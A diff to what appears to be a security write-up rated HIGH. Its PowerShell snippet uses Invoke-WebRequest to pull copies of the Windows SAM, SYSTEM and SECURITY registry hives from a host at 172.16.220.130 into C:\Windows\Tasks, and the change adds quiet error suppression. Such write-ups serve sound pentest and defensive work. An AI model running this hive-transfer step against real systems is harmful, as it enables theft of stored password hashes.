@@ -56,6 +56,7 @@ Severity: HIGH
 ```shell
 $files = @("SYSTEM-2025-02-11", "SECURITY-2025-02-11", "SAM-2025-01-15")
 foreach ($file in $files) {
-    Invoke-WebRequest -Uri "http://172.16.220.130/$file" -OutFile "C:\Windows\Tasks\$file"
+    Write-Host "[*] Attempting to fetch: $file" -ForegroundColor Cyan
+    Invoke-WebRequest -Uri "http://172.16.220.130/$file" -OutFile "C:\Windows\Tasks\$file" -ErrorAction SilentlyContinue
 }
 ```
